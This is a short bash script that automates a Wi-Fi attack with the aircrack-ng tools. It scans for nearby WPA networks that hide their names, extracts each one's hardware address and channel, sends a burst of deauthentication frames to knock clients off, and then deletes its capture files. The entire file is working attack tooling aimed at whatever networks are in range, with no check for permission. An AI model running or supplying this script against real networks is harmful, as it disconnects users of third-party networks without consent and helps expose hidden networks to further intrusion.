#!/bin/bash
sudo airmon-ng start wlan0
wait
timeout -s SIGINT 20 sudo airodump-ng --write ~/Desktop/dumpData --output-format netxml mon0 &
wait
pcregrep -Mo "<encryption>WPA <\/encryption>\n*\t*<essid cloaked=\"true\">.*<\/essid>\n*\t*<\/SSID>\n*\t*<BSSID>.*<\/BSSID>\n*\t*<channel>.*<\/channel>" ~/Desktop/dumpData-01.kismet.netxml >> target.txt
wait
HWADDR=($(grep -oP '(?<=<BSSID>).*?(?=</BSSID>)' ~/Desktop/target.txt))
CHANNE=($(grep -oP '(?<=<channel>).*?(?=</channel>)' ~/Desktop/target.txt))
#DEBUG------
echo $HWADDR
echo $CHANNE
#-----------
sudo airmon-ng stop mon0
sudo airmon-ng start wlan0 $CHANNE
wait
sudo aireplay-ng --ignore-negative-one --deauth 15 -a $HWADDR mon0
rm ~/Desktop/dumpData-01.kismet.netxml
rm ~/Desktop/target.txt
sudo airmon-ng stop mon0
#MOAR-DEBUG-
echo $HWADDR
#-----------
